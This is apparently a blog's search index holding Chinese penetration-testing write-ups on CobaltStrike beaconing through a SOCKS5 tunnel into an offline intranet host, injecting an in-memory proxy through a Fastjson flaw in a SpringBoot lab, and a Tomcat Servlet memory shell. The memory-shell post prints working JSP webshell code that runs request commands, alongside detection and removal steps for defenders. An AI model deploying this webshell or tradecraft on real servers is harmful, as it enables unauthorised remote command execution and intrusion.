<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CobaltStrike-一种特殊的不出网上线方式</title>
      <link href="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/"/>
      <url>/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="CobaltStrike-一种特殊的不出网上线方式"><a href="#CobaltStrike-一种特殊的不出网上线方式" class="headerlink" title="CobaltStrike-一种特殊的不出网上线方式"></a>CobaltStrike-一种特殊的不出网上线方式</h2><p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>接上文</p><p>SpringBoot场景下不出网-内存中的正向代理 <a href="https://seven1an.github.io/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/">https://seven1an.github.io/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/</a></p><p>这种场景出现在，当我拿下了一台内网机器，这台机器不出网</p><p>我之所以可以拿下他，是因为他的web服务通过dmz区的反向代理对外开放，也就是说我通过正向内存马将他Getshell、通过了正向代理搭建了进入内网的隧道</p><p>现在，我想让他上线CobaltStrike方便后续的提权和横向</p><p><img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/1.png" alt="image-20240823110622518"></p><p>我所拿下的机器也就是这台Windows Web，如果想让他上线CS，普遍操作应该是先打到Linux，让Linux先上线CS，再在CS中通过Linux这台机器的beacon连接Windows Web实现正向连接上线</p><p>但现在出了一些问题，这台Linux没有漏洞，打不进去，还存在着Linux上线CS各种各样的问题，这里是我用CrossC2生成的Payload无法上线</p><p>最终在<strong>F_Dao</strong>师傅耐心指导下</p><p>实现出了一种我从未见过的上线方法：通过本机 也就是图中的Hacker 运行反向的木马，让本机木马走建立的Socks5代理，通过冰蝎把正向木马在Windows Web中运行，后在CS中用我本机的Beacon正向连接Windows Web中正向木马监听的端口，实现上线，看文字描述非常的绕</p><p>师傅莫虑，且看此图</p><p><img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/2.png" alt="image-20240823140627584"></p><h4 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h4><p>环境准备：</p><p>在上一篇文章的基础上加入cs即可</p><ul><li>CobaltStrike</li><li>Behinder</li><li>Suo5</li><li>Proxifier</li></ul><h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><p>我已通过fastjson反序列化漏洞，打入内存马以及内存代理</p><p><img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/3.png" alt="image-20240823140912676"></p><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/4.png" alt="image-20240823140940935"></p><h6 id="本机上线"><a href="#本机上线" class="headerlink" title="本机上线"></a>本机上线</h6><p>先创建一个监听</p><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/5.png" alt="image-20240823141945465"></p><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/6.png" alt="image-20240823142018342"></p><p>基操不赘述</p><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/7.png" alt="image-20240823142208709"></p><p>双击上线</p><p><img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/8.png" alt="image-20240823142235934"></p><h6 id="指定隧道"><a href="#指定隧道" class="headerlink" title="指定隧道"></a>指定隧道</h6><p>让 7777.exe 走 socks5:&#x2F;&#x2F;127.0.0.1:1111 这个隧道</p><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/9.png" alt="image-20240823142901231"></p><p>这个时候，需要指定特定的hosts，这样就可以保证木马可以从我的本机通向外网连接Teamserver，又可以从Scosk5隧道连接目标内网机器</p><h6 id="目标上线"><a href="#目标上线" class="headerlink" title="目标上线"></a>目标上线</h6><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/10.png" alt="image-20240823143701170"></p><p>监听的4444，监听器命名也是4444</p><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/11.png" alt="image-20240823143724870"></p><p> 把payload通过Behinder上传到目标机器中运行，查看监听</p><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/12.png" alt="image-20240823144420120"></p><p>进入到本机的beacon中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">beacon&gt; </span><span class="language-bash">connect 192.168.200.200 4444</span></span><br></pre></td></tr></table></figure><p> <img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/13.png" alt="image-20240823144653201"></p><p>成功上线</p><p><img src="/2024/08/23/CobaltStrike-%E4%B8%80%E7%A7%8D%E7%89%B9%E6%AE%8A%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/img/14.png" alt="image-20240823144922474"></p><h4 id="END"><a href="#END" class="headerlink" title="END"></a>END</h4>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot场景下不出网-内存中的正向代理</title>
      <link href="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/"/>
      <url>/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="SpringBoot场景下不出网-内存中的正向代理"><a href="#SpringBoot场景下不出网-内存中的正向代理" class="headerlink" title="SpringBoot场景下不出网-内存中的正向代理"></a>SpringBoot场景下不出网-内存中的正向代理</h2><p><strong>免责声明：由于传播、利用本文所发布的而造成的任何直接或者间接的后果及损失，均由使用者本人承担</strong></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在Tomcat场景下，我们遇到不出网的机器通常上传reGeorg，suo5，这类的正向代理工具，连接后本地开启s5即可连接进入目标的网络场景</p><p>这里存在一些问题，有落地文件，这必然是存在被查杀的风险，现在诸多内存代理脚本也被杀毒软件加入了识别，并且安全设备也会有新增文件的感知</p><p>这里针对Tomcat只是提一下</p><p>当我们目标是SpringBoot场景呢？目标无法上传jsp，有落地脚本的正向代理就完全失去了作用</p><p>这样就衍生出了一种新技术，<strong>将正向代理写入到内存中去</strong>，就如同内存马一样</p><h4 id="START"><a href="#START" class="headerlink" title="START"></a>START</h4><p>环境准备</p><ul><li><p>SpringBoot靶场</p></li><li><p>NGINX</p></li><li><p>JMG</p></li><li><p>Suo5</p></li><li><p>Proxifier</p></li></ul><p>这里，是我为后面持续更新搭建的一个靶场</p><p>拓扑图如下：</p><p><img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/1.png" alt="image-20240730100817751"></p><p>依靠这个靶场，后续我会持续更新相关的文章，并且会不断在这个基础上进行优化与改进</p><h5 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h5><p>这里使用Fastjson的反序列化漏洞演示</p><p>​    因为目标服务器不出网，自然就用不了JdbcRowSetImpl利用链这种jndi注入的利用方式，就只能选择直接传入恶意代码，而TemplatesImpl利用链虽然原理上也是利用了 ClassLoader 动态加载恶意代码，但是需要开启Feature.SupportNonPublicField，并且实际应用中其实不多见，所以这里使用BasicDataSource链，直接在Payload中直接传入字节码，不需要开启特殊的参数，适用范围较广，目标需要引入tomcat依赖，虽说也是一种限制，但还算是比较常见的。</p><p>这里还有一个细节问题，因为jdk8u251之后 bcel被移除，需要留意无法使用BCEL ClassLoader的问题</p><p>SpringBoot靶场使用以及一些依赖包的修改就不赘述了，文章核心是演示内存正向代理</p><h6 id="访问Fastjson"><a href="#访问Fastjson" class="headerlink" title="访问Fastjson"></a>访问Fastjson</h6><p><img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/2.png" alt="image-20240730105534744"></p><h6 id="内存正向代理制作"><a href="#内存正向代理制作" class="headerlink" title="内存正向代理制作"></a>内存正向代理制作</h6><p>这里使用jMG(java-memshell-generator)</p><p>一款支持高度自定义的 Java 内存马生成工具｜A highly customizable Java memory-shell generation tool.</p><p><a href="https://github.com/pen4uin/java-memshell-generator">https://github.com/pen4uin/java-memshell-generator</a></p><p>非常叼的工具，免去了手写并且转换为bcel码的过程，并且支持非常多的payload格式</p><p><img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/3.png" alt="image-20240730111417621"></p><p>根据自己的需要选择好对应的框架以及各类所需参数</p><h6 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h6><p>留意好，在实现处说的信息，然后按照常规打法即可</p><p><img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/4.png" alt="image-20240730110429233"></p><p>这里大都是成功了</p><h6 id="连接正向代理"><a href="#连接正向代理" class="headerlink" title="连接正向代理"></a>连接正向代理</h6><p>留意连接所需的信息，比如这里是需要携带一个 Referer</p><p> <img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/5.png" alt="image-20240730111535501"></p><p>在suo5中连接</p><p> <img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/6.png" alt="image-20240730111556913"></p><p>连接成功</p><p> <img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/7.png" alt="image-20240730111620933"></p><h6 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h6><p>使用Proxifier指定程序走的隧道</p><p> <img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/9.png" alt="image-20240730111832749"></p><p> <img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/8.png" alt="image-20240730111809796"></p><p>这都没什么好说的，学到这里的师傅肯定是都知道的</p><p>连接成功</p><p> <img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/10.png" alt="image-20240730112032720"></p><p><img src="/2024/07/29/Springboot%E5%9C%BA%E6%99%AF%E4%B8%8B%E4%B8%8D%E5%87%BA%E7%BD%91-%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/img/11.png" alt="image-20240730112051766"></p><p>至此成功实现了SpringBoot场景下内存的正向代理使用</p><h4 id="END"><a href="#END" class="headerlink" title="END"></a>END</h4>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet内存马的利用与排查</title>
      <link href="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/"/>
      <url>/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="Java安全之Servlet内存马的利用以及排查"><a href="#Java安全之Servlet内存马的利用以及排查" class="headerlink" title="Java安全之Servlet内存马的利用以及排查"></a>Java安全之Servlet内存马的利用以及排查</h3><p><strong>前言：原理说起来太多了，不懂的可以先去学一下原理，本文主要做一个扫盲级别的利用，以及以蓝队的视角对这类木马排查的大致流程。</strong></p><h4 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h4><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><ul><li><p>idea 2023.1.2</p></li><li><p>tomcat 8.5.100</p></li><li><p>冰蝎v4.1</p></li><li><p>tomcat-memshell-scanner</p></li><li><p>包含文件上传的servlet项目</p></li></ul><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/1.jpg" alt="image-20240526163424209"></p><p>留意，需要加上此依赖</p><p>打成war，并且更改名字为ROOT.war来部署到tomcat中</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/2.jpg" alt="image-20240526163825086"></p><p>访问</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/3.jpg" alt="image-20240526164049967"></p><p>简单的上传测试成功</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/4.jpg" alt="image-20240526164137984"></p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/5.jpg" alt="image-20240526164156688"></p><h5 id="内存马利用"><a href="#内存马利用" class="headerlink" title="内存马利用"></a>内存马利用</h5><p>源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MemServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">            message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;command&quot;</span>);</span><br><span class="line">            Runtime.getRuntime().exec(command);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)applicationContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">standarContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standarContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) standarContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">    wrapper.setName(<span class="string">&quot;MemServlet&quot;</span>);</span><br><span class="line">    wrapper.setServletClass(MemServlet.class.getName());</span><br><span class="line">    wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">MemServlet</span>());</span><br><span class="line"></span><br><span class="line">    context.addChild(wrapper);</span><br><span class="line">    context.addServletMappingDecoded(<span class="string">&quot;/memshell&quot;</span>,<span class="string">&quot;MemServlet&quot;</span>);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传成功</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/6.jpg" alt="image-20240526164609901"></p><p>访问 使其注册</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/7.jpg" alt="image-20240526165010421"></p><p>响应空白 本身就没有输出 这里已经成功了</p><p>根据内存马中的路径和传参去执行命令验证</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/8.jpg" alt="image-20240526165239016"></p><p>成功收到dnslog</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/9.jpg" alt="image-20240526165259925"></p><p>命令执行成功，也就意味着getshell，后续任何操作 有命令执行的条件 皆可为</p><h5 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h5><p>现在，我们以蓝队，或者被攻击者的视角，去排查servlet内存马的问题，我们如何去发现，排查，以及修复。</p><p><strong>一、</strong></p><p>servlet内存马，必须需要jsp文件的落地，也就是会有新文件的增加，我们只需要着重关注jsp后缀即可</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/10.jpg" alt="image-20240526165751575"></p><p>我们看到新增的jsp文件，去把他进行下载，分析代码做了什么来决定后续的操作，是webshell还是内存马？</p><p><strong>二、</strong></p><p>jsp文件落地后，当内存马注册成功，攻击者会将jsp文件删除，这样，我们就需要在日志或者流量设备中分析请求的路径。首先</p><p>访问了一个上传成功的jsp文件</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/11.jpg" alt="image-20240526170601313"></p><p>但假设攻击者已经将其删除，这个文件不存在了，但内存马已经注册成功，这个就可以成为分析的要点：访问了成功上传的文件，但是这个文件现在已经不存在</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/12.jpg" alt="image-20240526170710111"></p><p>如果这样，就要去分析 攻击者的请求，内存马必然是有一个映射路径的，而这个路径 大都不是存在于项目的源码中</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/13.jpg" alt="image-20240526171205301"></p><p>我们就可以从对这个项目的了解，它有哪些映射路径？哪些映射路径何时进行了修改 什么时候又增加了哪些映射路径，根据文件上传命令执行这一系列的时间，综合去分析，比如案例中的源码，就两个映射路径<code>@WebServlet(&quot;/upload&quot;)</code> 和<code>@WebServlet(&quot;/HelloWorld&quot;)</code>，攻击者访问了memeshell居然还是200 ，所以memshell 当然就是内存马的映射路径</p><p><strong>三、</strong></p><p>使用工具进行排查和分析 以及 修复！</p><p>tomcat-memshell-scanner ：<a href="https://github.com/c0ny1/java-memshell-scanner">https://github.com/c0ny1/java-memshell-scanner</a></p><p>上传到任意web目录中即可</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/14.jpg" alt="image-20240526172528692"></p><p>​它会jvm中运行的类可视化展示，提供对class文件的下载 以及kill</p><p>​通过这个工具，观察可疑的Serlvet name，映射路径，Serlvet class，Servlet classLoader以及它所处的具体文件</p><p>​具体去查看 源码中有无这个映射路径，或者磁盘上有无这个class</p><p>​servlet内存马 需要着重观察JSP Servlet类加载器 JasperLoader，有这个 极大概率为内存马文件</p><p>​将可疑的class进行下载 反编译看源码。</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/15.jpg" alt="image-20240526173452775"></p><p> 这里也是我们刚刚的内存马</p><p> kill即可</p><p><img src="/2024/05/26/Servlet%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%92%E6%9F%A5/img/16.jpg" alt="image-20240526173759490"></p><p>这里的话 内存马也就失效了</p><p>重启也可以，但是实际中 重启是最后一招，因为重启对重大业务影响非常的大</p><p>这里只是演示简单的 这个流程和思路，后续会持续更新</p><h4 id="END"><a href="#END" class="headerlink" title="END"></a>END</h4>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件覆盖漏洞-crontab反弹shell细节问题</title>
      <link href="/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/"/>
      <url>/2024/05/15/%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E-crontab%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%E9%97%AE%E9%A2%98/</url>
      
